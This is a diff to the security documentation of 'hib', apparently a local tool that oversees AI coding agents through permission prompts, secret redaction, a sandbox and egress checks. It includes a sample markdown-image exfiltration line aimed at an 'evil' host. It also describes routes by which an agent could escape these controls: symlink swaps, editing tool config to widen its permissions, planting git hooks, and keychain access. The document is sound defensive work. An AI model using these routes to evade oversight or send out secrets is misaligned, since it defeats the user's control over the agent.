@@ -51,7 +51,8 @@ Any OpenAI client can use the router: set `OPENAI_BASE_URL=http://127.0.0.1:4141
 - **Auto mode** (`/auto`, or the **Ask first** chip in the browser; off by default, per session). Edits inside the folder and sandboxed commands run without asking. hib still asks for:
   - a command reaching a new network host (package registries like npm and PyPI excepted);
   - web fetches and web searches by the agent. The prompt shows the destination host, the full URL and what goes with it, and flags any secrets the guard finds there. Redacted values leave as `[HIB…]` placeholders, never as the real values. "Always" covers fetches from that one host;
-  - network tools, `git push`, publishing, `sudo`, `rm -r` and history rewrites;
+  - reads and searches outside the folder (the CLI's own file tools aren't sandboxed);
+  - network tools, `git push`, publishing (`npm … publish`, `twine upload`, `gem push` and similar), `sudo`, `rm -r` and history rewrites;
   - commands that touch hib's daemon or credential folders;
   - edits to tool config;
   - reads in sensitive folders.
@@ -78,7 +79,7 @@ The browser home page `/` lists your workspaces, and `/?router` is the multi-mod
 
 ```sh
 cd ~/code/client-project
-hib workspace sensitive --account claude@work   # pin this folder to one vendor account
+hib workspace sensitive --account claude@work   # pin this folder (and every folder inside it) to one vendor account
 hib workspace egress                            # what left the machine in the latest session, and to whom
 hib workspace normal                            # lift it
 ```
@@ -183,9 +184,10 @@ The log stores the redacted text locally in `~/.hib/hib.db`, so anything the gua
 
 - **Network:** the daemon listens on `127.0.0.1` only.
   - Host header checks stop DNS rebinding.
-  - Origin checks and a `SameSite=Strict` cookie stop other websites.
+  - Origin checks stop other websites, and there's no cookie for a cross-site request to carry.
   - API clients use the token in `~/.hib/token`.
-  - The browser gets its cookie only for a one-time login code in the link `hib serve` or `/web` prints, valid for 15 minutes. Minting a code needs the token.
+  - The browser never gets the token. The link `hib serve` or `/web` prints carries a one-time login code, valid for 15 minutes; minting one needs the token. The browser trades it for its own session id, stored hashed on the daemon and valid for 30 days. The page keeps that id in `localStorage`, which browsers keep separate per port. A cookie on 127.0.0.1 would also go to every other local server, including one an agent wrote.
+  - The page's Content-Security-Policy lets nothing load from elsewhere, and images in model output are never loaded. Restored text holds real values, so `![](https://evil/?d=…)` would otherwise send them out with no click.
 - **Files:** everything in `~/.hib` is `0600`.
   - `hib.db` holds conversations as originals, plus the audit log, which records counts, never values.
   - `vault.key` seals each conversation's token map with AES-256-GCM.
@@ -201,10 +203,12 @@ The log stores the redacted text locally in `~/.hib/hib.db`, so anything the gua
 
   hib's permission prompts still decide what runs. The sandbox limits what an approved command can do.
 - **What the sandbox doesn't cover:**
-  - The CLIs' own file tools (Read, Edit) aren't sandboxed. They are held to the folder by permission rules and hib's prompts instead. A path can change between hib's check and the CLI's write (a directory swapped for a symlink). So git hooks and config, `.claude/`, `.codex/` and `.mcp.json` are also checked by content after every turn. Changes you didn't approve are put back, and the timeline says so.
+  - The CLIs' own file tools (Read, Edit) aren't sandboxed. They are held to the folder by permission rules and hib's prompts instead, and Claude's Read is denied the same credential paths as commands, plus `~/.npmrc` and whole CLI homes. A path can change between hib's check and the CLI's write (a directory swapped for a symlink). So git hooks and config, `.claude/`, `.codex/` and `.mcp.json` are also checked by content after every turn. Changes you didn't approve are put back, and the timeline says so.
   - The macOS keychain stays reachable, so a command could ask for a login stored there. With the network closed, the only way out is back to the model's own vendor.
 - **Tool config needs approval every time.** "Always allow edits" never covers `.claude/`, `.codex/`, `.git/` or `.mcp.json` inside the folder, so an agent can't quietly widen its own permissions or plant a git hook.
-- **Policies can only be tightened over the API.** Lifting one takes `hib workspace normal` at the terminal, so the API token alone can't switch it off.
+- **Policies can only be tightened over the API.** Lifting one takes `hib workspace normal` at the terminal, so the API token alone can't switch it off, and the API won't forget a sensitive folder either.
+- **A policy covers the whole tree.** A sensitive folder's rules apply in every folder inside it, and a folder that contains a sensitive one is held to them too, since an agent there could read it. Opening hib on a folder that spans two sensitive folders pinned to different accounts is refused.
+- **hib's own git calls run no repo code.** Background-task commits, merges and worktree setup run without hooks; a repo's hooks can be files the agent edited (husky, lefthook). No git call hib makes on its own (status, diffs, the advisor's diff) starts an fsmonitor, external diff or textconv from config. Commits you make from the web git panel still run your hooks.
 - **Other local processes.** Anything else running as your user, outside an agent sandbox, can still read `~/.hib/token`. hib protects against its agents, not against your own account.
 - **Your own CLI config still applies:** your `settings.json` allow rules, MCP servers and `CLAUDE.md` / `AGENTS.md` load into agent sessions. Broad allow rules there bypass hib's prompts, and commands listed in your own `sandbox.excludedCommands` run outside the sandbox.
 - **Rendering:** model output is rendered as markdown without raw HTML.
